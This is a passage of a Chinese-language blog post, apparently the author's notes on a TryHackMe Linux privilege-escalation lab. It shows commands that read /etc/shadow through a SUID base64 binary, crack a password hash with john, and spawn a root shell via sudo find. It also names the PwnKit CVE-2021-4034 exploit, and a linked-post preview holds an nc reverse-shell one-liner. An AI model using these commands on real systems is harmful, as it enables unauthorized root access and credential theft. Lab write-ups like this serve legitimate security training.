<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423102852.png"><br>挂载后，再本机制作就行，无需再传到目标机上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +s 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在攻击机</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>切换到目标机提权，运行1就行，但是肥肠尴尬，我的GLIBC版本太高了，重新制作个吧<br>然后尝试静态编译，进入bash终端了，但是没提权<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423104749.png"><br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423104736.png"><br>然后发现忽略了一个问题，程序所有者不是root，切换用户，重来一次就成功提权了<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423105250.png"></p>
<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>想先找文件，结果一直没输出结果，看看报错，才知道权限不够，意思是先提权再说了</p>
<h2 id="信息收集一下"><a href="#信息收集一下" class="headerlink" title="信息收集一下"></a>信息收集一下</h2><p>传个林豌豆上去<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423114627.png"><br>啊既然说了脏牛能打，那就试一下<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423123011.png"><br>很好没打成功<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423123541.png"><br>那就继续看看还挖出了哪些可利用信息</p>
<h2 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h2><p><code>$PATH</code>变量中找到这些信息<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423134209.png"><br>没怎么利用上，然后找suid置位的，发现有<code>pkexec</code><br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423151250.png"><br>让ai分析了一下，可能会有pwnkit能利用，易受 CVE-2021-4034 影响 的版本一般是 polkit &lt; 0.112.0（Debian&#x2F;Ubuntu 通常 &lt; 0.105-26）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/pkexec --version</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423150609.png"><br>或者直接看<code>pkexec</code>的版本也行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkexec --version</span><br></pre></td></tr></table></figure>

<p>然后用CVE-2021-4034打通</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>pwnkit这个cve打通了<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423150119.png"></p>
<h2 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h2><p>想到之前利用过base64读文件，然后再利用john破解密码的，正好suid置位的也有base64<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423151726.png"><br>同时显示出了用终端的用户有三个<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423152111.png"><br>查看文件发现missy用户拥有sudo权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/sudoers|base64 --decode</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423153401.png"><br>那么思路就清晰了，破解missy的密码然后切换用户，用find提权<br>读取下文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/passwd|base64 --decode|grep missy</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/shadow|base64 --decode|grep missy</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423153644.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./john --wordlist=/home/lan1oc/fuzzDicts-master/rockyou/rockyou.txt --format=sha512crypt a.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423154231.png"><br>用find提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/bash \; -quit</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423154817.png"></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>提权挺有意思的，但是没思路的时候真的肥肠牢</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lan1oc.co">lan1oc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lan1oc.co/2025/04/11/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Linux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/">http://lan1oc.co/2025/04/11/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Linux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lan1oc.co" target="_blank">lan1ocのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/THM%E8%AE%B0%E5%BD%95/">THM记录</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/1.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/10/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%A4%8D%E5%81%A5%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DWhat%20the%20Shell%EF%BC%9F/" title="【复健笔记】[THM]What the Shell？"><img class="cover" src="/img/c1/3.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">【复健笔记】[THM]What the Shell？</div></div><div class="info-2"><div class="info-item-1">nc弹shelllinux：法一1mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f  然后再攻击机上： 1sudo rlwrap nc ip port  该命令首先在 &#x2F;tmp&#x2F;f 处创建一个命名管道 。然后，它启动 netcat 侦听器，并将侦听器的 input 连接到命名管道的输出。然后，netcat 侦听器的输出（即我们发送的命令）通过管道直接传输到 sh，将 stderr 输出流发送到 stdout，并将 stdout 本身发送到命名管道的输入中，从而完成循环 法二1mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f  然后攻击机上 1sudo rlwrap nc -lvnp...</div></div></div></a><a class="pagination-related" href="/2025/04/14/%E5%B7%A5%E4%BD%9C/%E5%AE%89%E6%81%92%E5%9F%B9%E8%AE%AD/%E8%93%9D%E9%98%9F%E5%9F%B9%E8%AE%AD---day1/" title="蓝队培训---day1"><img class="cover" src="/img/c1/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">蓝队培训---day1</div></div><div class="info-2"><div class="info-item-1">流量分析Ethernet II：看源&#x2F;目标mac地址Internet Protocol Version 4：源&#x2F;目的ipTransmission Control Protocol: 看源&#x2F;目的端口、flag位（判断哪些端口开放：syn+ack是开放，rst是未开放） 过滤语法和实践源ip为。。。。。1ip.src==  目的ip为。。。。1ip.dst==  源&#x2F;目的地址为。。。。1ip.addr==  看端口是否开放（过滤出回应syn+ack的包）1tcp.flags == 0x0012  比如找靶机开了什么端口观察分析都是攻击通过65127端口来扫描（因为靶机都是回应65127端口）那就加上 1tcp.dstport==65127   过滤请求方式比如过滤POST 1http.request.method==POST  模糊匹配路径关键字匹配http类型中带有admin@123 1http contains &quot;admin@123&quot;  比如匹配请求中带有upload的 1http.request.uri...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/18/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/Injection%20Attacks/" title="[THM]Web Application Pentesting---Injection Attacks  注入攻击"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-18</div><div class="info-item-2">[THM]Web Application Pentesting---Injection Attacks  注入攻击</div></div><div class="info-2"><div class="info-item-1">高阶 SQL 注入二次注入原理用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入 说白了，举个例子，有个更新数据的功能点，你之前添加的那一条数据项是恶意的sql语句，在执行这个功能后，他会被检索并当作正常sql语句执行，从而导致注入攻击 实践将所有书籍的标题更新为 “compromised”首先就是有个插入数据的网页先插个数据看看，显示了新插入的数据然后有一个更新数据的网页点击更新的数据包是这样这里看不出啥，从代码层面来分析就是 1234567if ( isset($_POST[&#x27;update&#x27;])) &#123;    $unique_id = $_POST[&#x27;update&#x27;];    $ssn = $_POST[&#x27;ssn_&#x27; . $unique_id];    $new_book_name...</div></div></div></a><a class="pagination-related" href="/2025/05/28/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%5BTHM%5DWeb%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/" title="[THM]Web Application Pentesting---Authentication  认证"><img class="cover" src="/img/c1/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-28</div><div class="info-item-2">[THM]Web Application Pentesting---Authentication  认证</div></div><div class="info-2"><div class="info-item-1">基础sessioncookie属性Secure - 向浏览器指示 Cookie 只能通过经过验证的 HTTPS 通道传输。如果存在证书错误或使用 HTTP，则不会传输 Cookie 值HTTPOnly - 向浏览器指示客户端 JavaScript 可能无法读取 Cookie 值Expire - 向浏览器指示 Cookie 值何时不再有效，应将其删除SameSite - 向浏览器指示是否可以在跨站点请求中传输 Cookie，以帮助防止 CSRF 攻击 tokenToken-Based Session Management最常见的令牌类型之一是 JSON Web 令牌 （JWT），一般形式 1Authorization: Bearer &lt;token&gt;  以前的盲点浏览器中不仅仅要注意cookie，还要注意本地存储的 JWT它没有使用浏览器的自动 cookie 管理功能，而是依赖于客户端代码来完成该过程。身份验证后，Web 应用程序会在请求正文中提供令牌。然后使用客户端 JavaScript 代码，此令牌将存储在浏览器的 LocalStorage...</div></div></div></a><a class="pagination-related" href="/2025/03/02/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Red%20Team%20Recon%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）</div></div><div class="info-2"><div class="info-item-1">内置工具（系统可识别并自下载的）whois一般能查到以下信息： 12345678910Registrar WHOIS server  注册 WHOIS 服务器Registrar URL  注册 URLRecord creation date  记录创建日期Record update date  记录更新日期Registrant contact info and address (unless withheld for privacy)注册人的联系信息和地址（除非出于隐私考虑而保留）Admin contact info and address (unless withheld for privacy)管理员联系信息和地址（除非出于隐私原因而保留）Tech contact info and address (unless withheld for privacy)技术联系信息和地址（除非出于隐私原因而隐瞒）  但一般都会有隐瞒，以我博客为例，基本全隐瞒了 nslookup使用默认 DNS 服务器来获取与域相关的 A 和 AAAA...</div></div></div></a><a class="pagination-related" href="/2025/02/19/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E6%9D%82%E8%B0%88%E4%B8%8E%E8%AF%81%E4%B9%A6/%E3%80%90%E9%9A%8F%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Red%20Team%20Threat%20Intel/" title="【随记】[THM]Red Teaming--Red Team Threat Intel"><img class="cover" src="/img/cover/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-19</div><div class="info-item-2">【随记】[THM]Red Teaming--Red Team Threat Intel</div></div><div class="info-2"><div class="info-item-1">意识流答案这个房间不难，但是有一些意识流的东西，比如Task 7Creating a Threat Intel Driven Campaign的第一个问题能知道是要比对APT 41的网络杀伤链来写答案，但是比对过程。。。。图案和文字我是实在没怎么对上啊，硬写就对了第一个，然后就去看wp了贴个答案吧👇然后就是另一个问题纯属基础不好导致的，首先理解LOLBAS（Living Off The Land Binaries and Scripts）工具是什么：利用系统中已有的合法工具或命令行脚本来执行恶意活动，从而避过传统的防御然后就是对着MITRE中的软件一个个在自己电脑上搜了，毕竟说了是已有的合法工具，然后也是查到了 综上结了吧 </div></div></div></a><a class="pagination-related" href="/2025/04/22/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DWindows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/" title="【学习笔记】[THM]Windows Privilege Escalation(windows提权)"><img class="cover" src="/img/c1/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-22</div><div class="info-item-2">【学习笔记】[THM]Windows Privilege Escalation(windows提权)</div></div><div class="info-2"><div class="info-item-1">基本知识点Administrators组可以更改系统配置SYSTEM &#x2F; LocalSystem 帐户比管理员用户具有更多的权限Local Service用于以“最低”权限运行 Windows 服务的默认帐户。它将通过网络使用匿名连接Network Service用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证 收集密码的常用位置无人值守的 Windows 安装在大量主机上安装 Windows 时，管理员可以使用 Windows...</div></div></div></a><a class="pagination-related" href="/2025/03/13/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/THM/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ffuf/" title="【学习笔记】[THM]ffuf"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-13</div><div class="info-item-2">【学习笔记】[THM]ffuf</div></div><div class="info-2"><div class="info-item-1">基本使用直接扫网站就行了，根据之前的提示 1./ffuf -u http://10.10.127.184/FUZZ -w ../SecLists/Discovery/Web-Content/big.txt  回答问题：您找到的第一个状态代码为 200 的文件是什么？ 查找页面和目录使用通用文件列表（如 raft-medium-files-lowercase.txt）开始枚举 1./ffuf -u http://10.10.127.184/FUZZ -w ../SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt  对应第一个问题：您找到的是什么文本文件？ 尝试仅针对索引页面的常见扩展 1./ffuf -u http://10.10.127.184/indexFUZZ -w ../SecLists/Discovery/Web-Content/web-extensions.txt  对应第二个问题：为索引页找到哪两个文件扩展名？ 从此单词列表中排除 4 个字母的扩展名，因为它会导致许多误报 1./ffuf -u...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/joker.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lan1oc</div><div class="author-info-description">57qv6I+c54uX572i5LqG</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lan1oc"><i class="fab fa-github"></i><span>没啥用的仓库</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随便写写</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">1.1.</span> <span class="toc-text">主机名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">系统信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E5%92%8C%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">内核版本和其他数据的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etc-issue-%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">1.4.</span> <span class="toc-text">&#x2F;etc&#x2F;issue 系统版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.5.</span> <span class="toc-text">看进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.6.</span> <span class="toc-text">看环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E5%85%81%E8%AE%B8%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8-root-%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4-%E9%B8%A1%E8%82%8B%EF%BC%8C%E8%A6%81%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">看允许用户使用 root 权限运行哪些命令(鸡肋，要密码)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">1.8.</span> <span class="toc-text">看用户组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etc-passwd"><span class="toc-number">1.9.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.10.</span> <span class="toc-text">历史命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.11.</span> <span class="toc-text">系统网络接口的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E7%BD%91%E7%BB%9C%E7%BB%9F%E8%AE%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.12.</span> <span class="toc-text">看网络统计信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-find%E5%91%BD%E4%BB%A4%E5%BE%80%E5%BE%80%E4%BC%9A%E4%BA%A7%E7%94%9F%E9%94%99%E8%AF%AF%EF%BC%8C%E5%9B%A0%E6%AD%A4%E4%B8%80%E8%88%AC%E9%83%BD%E4%BC%9A%E5%8A%A0%E4%B8%80%E4%B8%AA%EF%BC%9A2-dev-null"><span class="toc-number">1.13.</span> <span class="toc-text">find(find命令往往会产生错误，因此一般都会加一个：2&gt;&#x2F;dev&#x2F;null)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98"><span class="toc-number">1.14.</span> <span class="toc-text">回答问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">自动枚举工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PEASS-ng%E6%84%9F%E8%A7%89%E6%98%AF%E6%9C%80%E5%A5%BD%E7%94%A8%E7%9A%84"><span class="toc-number">2.1.</span> <span class="toc-text">PEASS-ng感觉是最好用的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E5%85%88%E7%94%A8les-sh-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%89%AB%EF%BC%8C%E6%89%AB%E5%87%BA%E4%BA%86%E7%9B%B4%E6%8E%A5%E7%94%A8%EF%BC%8C%E7%94%A8%E4%B8%8D%E4%BA%86%E5%86%8D%E7%94%A8%E6%9C%AC%E4%BD%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.1.</span> <span class="toc-text">可以先用les.sh(提权漏扫，扫出了直接用，用不了再用本体信息收集)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LinEnum"><span class="toc-number">2.2.</span> <span class="toc-text">LinEnum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LES-Linux-Exploit-Suggester"><span class="toc-number">2.3.</span> <span class="toc-text">LES (Linux Exploit Suggester)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Smart-Enumeration%E8%BF%99%E4%B8%AA%E4%B9%9F%E8%BF%98%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">Linux Smart Enumeration这个也还行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">利用内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">内核漏洞利用方法思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%AF%BC%E8%87%B4%E7%B3%BB%E7%BB%9F%E5%B4%A9%E6%BA%83%E3%80%82%E5%9C%A8%E5%B0%9D%E8%AF%95%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E4%B9%8B%E5%89%8D%EF%BC%8C%E8%AF%B7%E7%A1%AE%E4%BF%9D%E6%AD%A4%E6%BD%9C%E5%9C%A8%E7%BB%93%E6%9E%9C%E5%9C%A8%E6%82%A8%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8F%82%E4%B8%8E%E8%8C%83%E5%9B%B4%E5%86%85%E6%98%AF%E5%8F%AF%E6%8E%A5%E5%8F%97%E7%9A%84"><span class="toc-number">3.1.1.</span> <span class="toc-text">失败的内核漏洞可能会导致系统崩溃。在尝试利用内核之前，请确保此潜在结果在您的渗透测试参与范围内是可接受的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">3.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">利用sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E7%9B%B4%E6%8E%A5%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.1.</span> <span class="toc-text">sudo直接提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.2.</span> <span class="toc-text">LD_PRELOAD利用的思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98-1"><span class="toc-number">4.2.</span> <span class="toc-text">回答问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7-%E2%80%9Ckaren%E2%80%9D-%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%85%B7%E6%9C%89-sudo-%E6%9D%83%E9%99%90%E7%9A%84%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%A4%9A%E5%B0%91%E4%B8%AA%E7%A8%8B%E5%BA%8F%EF%BC%9F"><span class="toc-number">4.2.1.</span> <span class="toc-text">用户 “karen” 可以在具有 sudo 权限的目标系统上运行多少个程序？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-txt-%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.2.2.</span> <span class="toc-text">flag2.txt 文件的内容是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%82%A8%E7%9A%84%E7%94%A8%E6%88%B7%E5%9C%A8-nmap-%E4%B8%8A%E6%8B%A5%E6%9C%89-sudo-%E6%9D%83%E9%99%90%EF%BC%8C%E6%82%A8%E5%B0%86%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-Nmap-%E7%94%9F%E6%88%90%E6%A0%B9-shell%EF%BC%9F"><span class="toc-number">4.2.3.</span> <span class="toc-text">如果您的用户在 nmap 上拥有 sudo 权限，您将如何使用 Nmap 生成根 shell？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 